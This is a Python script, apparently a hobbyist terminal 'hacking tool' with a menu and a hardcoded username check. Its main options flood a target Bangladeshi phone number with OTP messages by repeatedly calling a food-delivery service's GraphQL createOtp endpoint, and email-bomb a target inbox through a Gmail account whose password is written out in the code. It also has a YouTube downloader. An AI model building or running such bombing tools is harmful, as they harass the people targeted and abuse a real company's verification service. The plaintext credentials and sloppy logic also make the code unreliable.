#!/bin/python
#Coder MD
#GitHub : htpps://github.com/mao2116
#FB ID:  https://www.facebook.com/ekramul.hassan.79827
import os
try:
  from termcolor import *
  from pyfiglet import *
  from pytube import *
  import requests,time,os,sys,smtplib,pytube
except:
  print("Please Install all requerment .")
  x = input("Your Requerment Install Please [y or n] :")
  
  if x== 'y' or 'Y':
    os.system('pip install requests ')
    os.system('pip install pytube')
    os.system('pip install termcolor')
    os.system('pip install pyfiglet')
    #os.system('pip install')
    #os.system('pip install ')
  else:
    
    print("if You Can't Install  Requerments Then Tool Not Run.")
    print("Install Requerments") 
  exit()
user = 'mao'#
passwd = '2116'#

def word (z):
  for word in z + '\n':
     sys.stdout.write(word)
     sys.stdout.flush()
     time.sleep(0.01)




os.system('clear')


while True:
  us = input(colored("USERNAME: ", 'green'))
  if us == '0':
  
    



        while True:

          x = colored("[1.] Bangladesh :880", 'green')
          x1 = colored("[2.] Youtube Video Download: ", 'green')
          x2 = colored("[4.] For Cheack Updates And MoreTools: ", 'green')
         
          x7 = colored("[3.] Email Bombing :", 'green')
          x6 =colored("[6.] To Exit", 'red')
          xhlp = colored("[5.] For Report Any Kind Of Problem :", 'green')
         
          
          word(" ")
          
          word(" ")
          
          word(" ")
          
          word(" ")
         
          word(x)
          word(x1)
          word(x7)
          word(x2)
          word(xhlp)
          word(x6)
          word(" ")
          
          word(" ")
          time.sleep(0)
          
          
          x4 = input(colored("Chose One Of Them :", 'green'))
          
          if x4 == '1':
           num = input(colored("Target Number :", 'cyan'))
           while True:
             print(colored("Max 50!!", 'green'))
             msg = input(colored("How Much You Want To Send :", 'green'))
             mm = int(msg)
             if (mm < 50):
              for i in range(mm):
               data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
  
               res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
               #print(colored(res, 'green'))
               mao = ('880'+num)
               mao = colored(mao, 'green')
               print(mao)
               if res.status_code == 200:
                 word(colored("Message Sent SuccessFuly", 'cyan'))
               else:
                word(colored("sorry", 'green'))
              os.system("xdg-open www.")
              break
             else:
               word(colored("Max Message 50 , Please Try Again", 'green'))



           break
 
          elif x4 == '2':
            
            while True:
              gt = input(colored("Input Link \n >>",   'green'))
              ut = requests.get(gt)
              if ut.status_code == 200:
                print(colored("Your Link Is Still Working.", 'green'))
                print(colored("So We Good To Go :: ", 'green'))
                vdp= input(colored("Save Path : \n >>", 'cyan'))
                try:
                   w = figlet_format("Wait", 'big')
                   w = colored   (w, 'cyan')
                   word(w)
                   youtube = pytube.YouTube(gt)
                   video = youtube.streams.first()
                   video.download('/sdcard/'+vdp) 
                   ds = figlet_format("Download Successed", 'small')
                   ds = colored(ds, 'green')
                   print(ds)
                except:
                   word(colored("Try Again", 'green'))
      
                break
              else:
                print(colored("Your Link Is Not Working, Try another One", 'green'))
      
      
    
  


            break
          elif x4 == '4':
            
            x = figlet_format("Wait", 'big')
            x = colored(x, 'green')
            x1 = figlet_format("Cheaking Your Github,,,", 'small')
            x1 = colored(x1, 'cyan')
            word(x1)
            word(x)
            os.system('xdg-open https://github.com/mao2116/')
            break
          elif x4 == '3':
            server = smtplib.SMTP('smtp.gmail.com', 587)

            server.starttls()
            server.login("hackermao2116@gmail.com","2116hackermao@")
            mm = input(colored("How Much You Want To Send :", 'green'))
            mm = int(mm)
            gm = input(colored("Target Gmail :", 'green'))
            sm = input(colored("What You Want To Send :", 'green'))
            for i in range(mm):
              try:
                server.sendmail("hackermao2116@gmail.com",gm,sm)
                print("SuccessFuly Email Sent!")
              except:
                print("Try Again.")
            break    
          elif x4 == '5':
            res = requests.get("https://www.facebook.com/ekramul.hassan.79827")
            if res.status_code == 200 :
              os.system("xdg-open www.")
            else:
              print(colored("Server Time Out.", 'red'))
            break
          elif x4 == '6':
            exit()
            
          else:
             word("Your Input Is Wrong")
            
          
        